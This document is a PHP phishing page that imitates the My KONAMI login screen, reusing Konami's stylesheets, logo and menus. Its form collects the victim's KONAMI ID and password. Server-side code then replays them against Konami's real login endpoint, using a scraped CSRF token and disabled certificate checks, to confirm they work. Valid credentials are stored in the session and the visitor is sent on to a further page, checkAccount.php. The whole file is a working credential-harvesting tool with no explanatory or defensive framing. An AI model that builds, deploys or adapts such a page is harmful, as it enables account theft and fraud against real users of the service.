<?php 

error_reporting(0);

$msgLogin = "";

if(isset($_POST['goLogin'])) {
    $email    = $_POST['email'];
    $password = $_POST['password'];
    
    function grab_page($site){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($ch, CURLOPT_TIMEOUT, 40);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");
        curl_setopt($ch, CURLOPT_URL, $site);
        ob_start();
        return curl_exec($ch);
        ob_end_clean();
        curl_close($ch);
    }
     
    $csrfmiddlewaretoken = grab_page("https://e-football.konami.net/login/konami_id/?rurl=https%253A%252F%252Fe-football.konami.net%252Fopen%252F2020%252Feu%252Fen%252Fentry%252Finput%252F");
    
    if($csrfmiddlewaretoken) {
        $doc = new DOMDocument();
        libxml_use_internal_errors(true);
        $doc->loadHTML($csrfmiddlewaretoken);
        $xpath = new DOMXPath($doc);
    
        $setToken = $xpath->query('//input[@name="csrfmiddlewaretoken"]/@value')->item(0)->nodeValue;
    
        $userId   = $email;
        $password = $password;
        $otpass   = "";
    
        $site    = "https://account.konami.net/auth/login.html";
        $payload = "csrfmiddlewaretoken=".$setToken."&userId=".$userId."&password=".$password."&otpass=".$otpass;
    
        $cookie = "/cok.txt";
        $login2 = curl_init();
            curl_setopt($login2, CURLOPT_COOKIEJAR, getcwd().$cookie);
            curl_setopt($login2, CURLOPT_COOKIEFILE, getcwd().$cookie);
            curl_setopt($login2, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($login2, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($login2, CURLOPT_RETURNTRANSFER, TRUE);
            curl_setopt($login2, CURLOPT_URL, $site);
            curl_setopt($login2, CURLOPT_FOLLOWLOCATION, TRUE);
            curl_setopt($login2, CURLOPT_POST, TRUE);
            curl_setopt($login2, CURLOPT_POSTFIELDS, $payload);
            ob_start();
            $data = curl_exec($login2);
            ob_end_clean();
            curl_close ($login2);
    
        $classes = "error";
        preg_match('/<p class="'.$classes.'">(.*?)<\/p>/s', $data, $match); 
        
        if($match[1] == "Unable to log in. Please verify your login ID and password." || $match[1] == "KONAMI ID is locked.") {
            $msgLogin = '<p class="text-center"><span style="color: red;">Unable to log in. Please verify your login ID and password.</span></p>';
            file_put_contents(getcwd().$cookie, "");
            unset($_POST);
        } else {
            file_put_contents(getcwd().$cookie, "");
            session_start();
            $_SESSION['userId']   = $userId;
            $_SESSION['password'] = $password;

            header('location: checkAccount.php');
        }
    }
}

?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="ja"><head id="head">
        <meta charset="UTF-8" />
        <meta name="description" content="KONAMI IDはコナミグループが提供するサービスをご利用いただく為の、あなた専用のIDです。My KONAMI（マイコナミ）より無料でご登録・ご利用いただけます。" />
        <meta name="keywords" content="KONAMI ID, My KONAMI, eAMUSEMENT, PASELI" />
        <title>My KONAMI</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <!-- Bootstrap -->
        <link href="https://my.konami.net/common/css/bootstrap.css" rel="stylesheet" />
    <link href="https://my.konami.net/common/css/bootstrap-mykonami.css" rel="stylesheet" />
    <link href="https://my.konami.net/common/css/bootstrap-responsive.css" rel="stylesheet" />
    <link href="https://my.konami.net/common/css/site.css" rel="stylesheet" />
    <link rel="apple-touch-icon-precomposed" href="/common/img/sp/apple-touch-icon-precomposed.png" />
    <link rel="shortcut icon" href="/common/img/sp/apple-touch-icon-precomposed.ico" /><!--[if lte IE 8]><link rel="stylesheet" href="/common/css/ie.css" media="screen,print"><![endif]--><!-- Google Tag Manager --></head><body id="body"><!-- Google Tag Manager (noscript) --><noscript>
    <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-K4FHZBX" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript><!-- End Google Tag Manager (noscript) -->

    <!-- ======================== &#12504;&#12483;&#12480;&#12540;&#12371;&#12371;&#12363;&#12425; =================================== -->

<!-- ======================== &#12504;&#12483;&#12480;&#12540;&#12371;&#12371;&#12363;&#12425; =================================== -->
    <div id="knm-str-header" class="navbar navbar-inverse status-login">
<form id="header-form" name="header-form" method="post" action="/login.html" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="header-form" value="header-form" />

        <div class="navbar-inner">

            <div class="container">
                <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"><span>メニュー</span></button>
                <p class="knm-logo">
                    <a href="./">
                        <img src="img/logo-konami.png" alt="KONAMI" />
                    </a>
                </p>
                <h1 id="knm-logo" class="brand">
<a href="./"><img src="img/logo-mykonami.png" alt="My KONAMI" /></a>
                </h1>
            </div>

            <div class="nav-collapse collapse">
                <div class="knm-utility">
                    <div class="container">
                        <div class="btn-toolbar">
                            <div class="btn-group"><a href="#" onclick="mojarra.jsfcljs(document.getElementById('header-form'),{'header-form:j_idt17':'header-form:j_idt17'},'');return false" class="btn knm-sign-up">Register For first time visitors</a><a href="#" onclick="mojarra.jsfcljs(document.getElementById('header-form'),{'header-form:j_idt18':'header-form:j_idt18'},'');return false" class="btn knm-login">Login</a>
                            </div>
                        </div>
                        <!-- /utility -->
                    </div>
                </div>

                <div role="navigation" id="knm-nav-global">
                    <div class="container">
                    <ul class="nav">
                        <li class="dropdown knm-id">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">KONAMI ID</a>
                            <ul class="dropdown-menu">
                                        <li><a href="#" onclick="mojarra.jsfcljs(document.getElementById('header-form'),{'header-form:j_idt29:0:j_idt41':'header-form:j_idt29:0:j_idt41'},'');return false">View/Edit registered information</a></li>
                                        <li><a href="#" onclick="mojarra.jsfcljs(document.getElementById('header-form'),{'header-form:j_idt29:1:j_idt45':'header-form:j_idt29:1:j_idt45'},'');return false">Update e-mail address</a></li>
                                        <li><a href="#" onclick="mojarra.jsfcljs(document.getElementById('header-form'),{'header-form:j_idt29:3:j_idt89':'header-form:j_idt29:3:j_idt89'},'');return false">ACCOUNT INFORMATION</a></li>
                                        <li><a href="#" onclick="mojarra.jsfcljs(document.getElementById('header-form'),{'header-form:j_idt29:4:j_idt57':'header-form:j_idt29:4:j_idt57'},'');return false">KONAMI OTP Service management</a></li>
                                        <li><a href="#" onclick="mojarra.jsfcljs(document.getElementById('header-form'),{'header-form:j_idt29:5:j_idt77':'header-form:j_idt29:5:j_idt77'},'');return false">KONAMI ID inquiry</a></li>
                                        <li><a href="#" onclick="mojarra.jsfcljs(document.getElementById('header-form'),{'header-form:j_idt29:6:j_idt81':'header-form:j_idt29:6:j_idt81'},'');return false">Reissue password</a></li>
                                        <li><a href="#" onclick="mojarra.jsfcljs(document.getElementById('header-form'),{'header-form:j_idt29:8:j_idt37':'header-form:j_idt29:8:j_idt37'},'');return false">Login history</a></li>
                                        <li><a href="#" onclick="mojarra.jsfcljs(document.getElementById('header-form'),{'header-form:j_idt29:9:j_idt61':'header-form:j_idt29:9:j_idt61'},'');return false">Delete KONAMI ID</a></li>
                            </ul>
                        </li>
                        <li class="dropdown knm-support">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">SUPPORT</a>
                            <ul class="dropdown-menu">
                                    <li><a href="/konamiid.html">What's KONAMI ID?</a></li>
                                    <li><a href="/otp.html">About the KONAMI OTP Service</a></li>
                                    <li><a href="/faq/login_alert_mail.html">Login alert mail</a></li>
                                    <li><a href="/faq/login_history.html">Login history</a></li>
                                    <li><a href="/faq.html">Frequently Asked Questions</a></li>
                                <li><a href="https://www.konami.com/games/inquiry/form/konami_id/en/">Contact us</a></li>
                            </ul>
                        </li>
                    </ul>
                    <!-- /knm-nav-global -->
                </div>
                </div>
            </div>
            <!--/.nav-collapse -->
        </div><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:0" value="-3150115217594233572:-2681613460321494442" autocomplete="off" />
</form>
    <!-- Modal -->
    <div id="knm-select-twoAuth" style="-webkit-tap-highlight-color:rgba(0,0,0,0)" data-backdrop="static" class="modal hide fade knm-modal" tabindex="-1" role="dialog" aria-labelledby="knm-select-region-label" aria-hidden="true">
<form id="twoAuth-form" name="twoAuth-form" method="post" action="/login.html" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="twoAuth-form" value="twoAuth-form" />

            <div class="modal-header" style="background-color: khaki;">
                <h3 id="knm-select-region-label">Request to Customers
                </h3>
            </div>
            <div class="modal-body">

                <h4>Please turn on two-step verification</h4>Two-step verification is a secure feature that asks for your KONAMI ID and your password, and also "a verification code" sent to your KONAMI ID registered email account.<br />
                <br />Even if KONAMI ID and your password are stolen by phishing hack attempts, it keeps unwanted someone who does not have "a verification code" out of your account by entering "a verification code" sent to you.<br />
            </div>
            <div class="modal-footer"><input type="submit" name="twoAuth-form:j_idt188" value="Next time" class="btn" /><input type="submit" name="twoAuth-form:j_idt189" value="Use now" class="knm-btn btn" />
            </div><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:0" value="-3150115217594233572:-2681613460321494442" autocomplete="off" />
</form>
    </div>
    <!-- Modal -->
    </div>
    <!-- ======================== &#12504;&#12483;&#12480;&#12540;&#12371;&#12371;&#12414;&#12391; =================================== -->
    <!-- ======================== &#12504;&#12483;&#12480;&#12540;&#12371;&#12371;&#12414;&#12391; =================================== -->

    <div id="knm-str-container" class="container-fluid">
        <div class="row-fluid">
                <!-- ======================== &#12513;&#12452;&#12531;&#12467;&#12531;&#12486;&#12531;&#12484;&#12371;&#12371;&#12363;&#12425; =========================== -->
                <div id="knm-nav-global" class="hidden-phone">
                    <div class="span3"></div>
                </div>
                <div class="span6">
                    <div class="knm-box">
                        <h2 class="hidden-phone"></h2>

                        <div class="knm-section">
                            <form method="POST" action="auth.php">

                                <?= $msgLogin ?>
<br>
                                <p class="text-center">
                                    <input name="email" placeholder="KONAMI ID or e-mail address" type="email" class="input-xlarge" required="true">
                                </p>

                                <p class="text-center">
                                    <input name="password" placeholder="Password" type="password" class="input-xlarge" required="true">
                                </p>

                                <p class="text-center">
                                    <button type="submit" name="goLogin" class="knm-btn-login btn">Login</button>
                                </p>
                                <p class="text-center"><a href="https://my.konami.net/" >Forgot your KONAMI ID?</a></p>
                                <p class="text-center"><a href="https://my.konami.net/" >Forgot your password?</a></p>
                            </form>
                            <form action="#">
                                <p class="text-center">
                                    <a href="https://my.konami.net/" class="knm-btn-entry knm-branch btn">Register For first time visitors</a>
                                </p>
                            </form>
                            <!-- /knm-section -->
                        </div>
                        <!-- /knm-box -->
                    </div>
                </div>

                <div id="knm-nav-global" class="hidden-phone">
                    <div class="span3"></div>
                </div>
                <!-- ======================== &#12513;&#12452;&#12531;&#12467;&#12531;&#12486;&#12531;&#12484;&#12371;&#12371;&#12414;&#12391; =========================== -->
        </div>
        <!-- /container-fluid -->
    </div>
    <script src="https://my.konami.net/common/js/jquery-1.9.0.min.js"></script>
    <script src="https://my.konami.net/common/js/jquery-1.9.0.min.js"></script>
    <script src="https://my.konami.net/common/js/bootstrap.js"></script>
</body>

</html>